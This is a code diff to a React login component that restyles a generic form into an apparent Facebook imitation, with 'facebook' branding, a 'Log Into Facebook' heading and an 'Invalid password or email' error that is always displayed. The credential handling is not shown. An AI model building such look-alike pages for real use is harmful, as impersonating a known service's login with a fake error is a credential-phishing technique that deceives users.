@@ -54,25 +54,32 @@ const Login = () => {
 
   if (!redir)
     return (
-      <form className={classes.form} method="POST" onSubmit={handleClick}>
-        <TextInput
-          placeholder={"please insert your Email"}
-          name={"email"}
-          type={"email"}
-          ref={email}
-        />
+      <div className={classes.container}>
+        <div className={classes.hero}>
+          <h1 className={classes.header}>facebook</h1>
+        </div>
+        <form className={classes.form} method="POST" onSubmit={handleClick}>
+          <p>Log Into Facebook</p>
+          <p className={classes.error}>Invalid password or email</p>
+          <TextInput
+            placeholder={" Email"}
+            name={"email"}
+            type={"email"}
+            ref={email}
+          />
 
-        {error && error.email && <p>{error.email}</p>}
+          {error && error.email && <p>{error.email}</p>}
 
-        <TextInput
-          placeholder={"password please"}
-          name={"password"}
-          type={"password"}
-          ref={password}
-        />
-        {error && error.password && <p>{error.password}</p>}
-        <Button handleClick={handleClick}>submit</Button>
-      </form>
+          <TextInput
+            placeholder={"Password "}
+            name={"password"}
+            type={"password"}
+            ref={password}
+          />
+          {error && error.password && <p>{error.password}</p>}
+          <Button handleClick={handleClick}>Log In </Button>
+        </form>
+      </div>
     );
   else {
     navigate("/");
